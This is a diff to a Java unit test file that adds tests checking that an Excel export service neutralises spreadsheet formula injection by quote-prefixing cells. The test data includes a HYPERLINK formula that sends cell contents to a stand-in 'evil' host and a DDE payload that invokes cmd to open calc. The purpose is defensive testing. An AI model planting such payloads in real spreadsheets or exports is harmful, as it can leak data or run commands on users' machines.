@@ -6,6 +6,7 @@ import java.time.Instant;
 import java.util.ArrayList;
 import java.util.List;
 
+import org.apache.poi.ss.usermodel.CellType;
 import org.apache.poi.ss.usermodel.Sheet;
 import org.apache.poi.xssf.usermodel.XSSFWorkbook;
 import org.junit.jupiter.api.BeforeEach;
@@ -23,6 +24,7 @@ import uz.orientadvertise.services.domain.repository.EventRepository;
 import uz.orientadvertise.services.domain.repository.PlaybackLogRepository;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
+import static org.junit.jupiter.api.Assertions.assertFalse;
 import static org.junit.jupiter.api.Assertions.assertNotNull;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 import static org.mockito.ArgumentMatchers.any;
@@ -144,6 +146,64 @@ class ExcelExportServiceTest {
         }
         // Repo never called because deadline check fires before the first fetch.
         verify(deviceRepository, times(0)).findActivePaged(any(), any(Pageable.class));
+    }
+
+    // ----- AUTHZ-03: formula injection -----
+
+    @Test
+    void deviceExport_formulaLookingName_isQuotePrefixedText_valueUnchanged() throws Exception {
+        String payload = "=HYPERLINK(\"http://evil/?\"&A1,\"click\")";
+        var d = mock(Device.class);
+        when(d.getId()).thenReturn(1L);
+        when(d.getSerialNumber()).thenReturn("SN-1");
+        when(d.getName()).thenReturn(payload);
+        when(deviceRepository.findActivePaged(any(), any(Pageable.class)))
+                .thenReturn(new PageImpl<>(List.of(d)));
+
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        service.streamExport(ExportType.DEVICES,
+                new ExcelExportService.ExportFilters(null, null, null, null), null, out,
+                System.currentTimeMillis() + 60_000);
+
+        try (var wb = new XSSFWorkbook(new ByteArrayInputStream(out.toByteArray()))) {
+            var name = wb.getSheet("Devices").getRow(1).getCell(2);
+            assertEquals(CellType.STRING, name.getCellType());
+            assertEquals(payload, name.getStringCellValue());
+            assertTrue(name.getCellStyle().getQuotePrefixed(), "editing the cell must not turn it into a formula");
+            // An ordinary value keeps the default style.
+            assertFalse(wb.getSheet("Devices").getRow(1).getCell(1).getCellStyle().getQuotePrefixed());
+        }
+    }
+
+    @Test
+    void eventsExport_formulaLookingPayload_isQuotePrefixed() throws Exception {
+        var event = mock(Event.class);
+        when(event.getId()).thenReturn(100L);
+        when(event.getEventType()).thenReturn("OFFLINE");
+        when(event.getPayload()).thenReturn("@SUM(1+1)*cmd|' /C calc'!A0");
+        when(eventRepository.findFiltered(any(), any(), any(), any(), any(), any(), any(Pageable.class)))
+                .thenReturn(new PageImpl<Event>(List.of(event)));
+
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        service.streamExport(ExportType.EVENTS,
+                new ExcelExportService.ExportFilters(null, null, null, null), null, out,
+                System.currentTimeMillis() + 60_000);
+
+        try (var wb = new XSSFWorkbook(new ByteArrayInputStream(out.toByteArray()))) {
+            var row = wb.getSheet("Events").getRow(1);
+            assertTrue(row.getCell(6).getCellStyle().getQuotePrefixed());
+            assertFalse(row.getCell(4).getCellStyle().getQuotePrefixed());
+        }
+    }
+
+    @Test
+    void looksLikeFormula_coversOwaspTriggers_only() {
+        for (String s : List.of("=1+1", "+1", "-1", "@A1", "\t=1", "\r=1")) {
+            assertTrue(ExcelExportService.looksLikeFormula(s), s);
+        }
+        for (String s : List.of("", "TV-1", " =1", "1=1", "SN-1")) {
+            assertFalse(ExcelExportService.looksLikeFormula(s), s);
+        }
     }
 
     @Test
